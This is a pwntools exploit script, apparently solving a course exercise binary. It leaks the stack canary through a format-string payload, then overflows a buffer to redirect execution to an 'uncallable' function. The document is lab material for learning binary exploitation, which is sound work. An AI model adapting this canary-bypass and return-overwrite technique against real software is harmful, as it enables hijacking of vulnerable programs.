#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise5/exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def int2bytes(i):
    return i.to_bytes(length=8, byteorder='little')

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

#print(r.recvall(timeout=2))

delim = ','
padding = 64
init_msg = (b"%p" + str.encode(delim)) * padding
r.sendline(init_msg)

output = r.recvuntil(b"the password\n")
print(output)

"""
Extract canary from output, which looks something like this: 
b'Enter the secret password for user 2:\n0x7fffe58689c0;0x1;0x7fce93e0efd2;0x26;0x26;(nil);0x4dadbd65b;
0x200000003;0x1;0x70253b70253b7025;0x253b70253b70253b;0x3b70253b70253b70;0x70253b70253b7025;0x253b70253b70253b;
0x3b70253b70253b70;0x70253b70253b7025;0x253b70253b70253b;0x3b70253b70253b70;0x70253b70253b7025;0x253b70253b70253b;
0x3b70253b70253b70;0x70253b70253b7025;0x253b70253b70253b;0x3b70253b70253b70;0x70253b70253b7025;0x253b70253b70253b;
0x3b70253b70253b70;0x70253b70253b7025;0x253b70253b70253b;0x3b70253b70253b70;0x70253b70253b7025;0x253b70253b70253b;
0x3b70253b70253b70;(nil);0x7fce93eee6a0;(nil);(nil);0x7fce93eea4a0;0x7fce93d8f53d;0x7fce93eee6a0;0x7fce93d48841;
0xdadbd65b;0xd7a20700;0x7fffe5868a50;0x401511;0xd7;0x4014a9;0xd700000000;0xdadbd65b00000000;0x7fffe5868b40;0x401550;
(nil);0x7fce93d25083;0x7fce93f27620;0x7fffe5868b48;0x100000000;0x4013b1;0x401550;0x9f89c385c6d4f3df;0x401170;0x7fffe5868b40;
(nil);(nil);0x60760888d214f3df;is not the password\n'
"""
canaries = output[len("Enter the secret password for user 2:\n"): -len("is not the password\n")]
print(canaries)
canaries = canaries.decode().split(delim)

overflow_string = b"X" * (padding * 4) + int(canaries[6], base=16).to_bytes(length=8, byteorder='little') + b"X" * (padding // 4) + b'\x1a\x10@' + b'\x00' * 5 + ELF(exe).symbols['uncallable'].to_bytes(length=8, byteorder='little')
r.sendline(overflow_string)

print(r.recvall(timeout=2).decode(errors='ignore'))
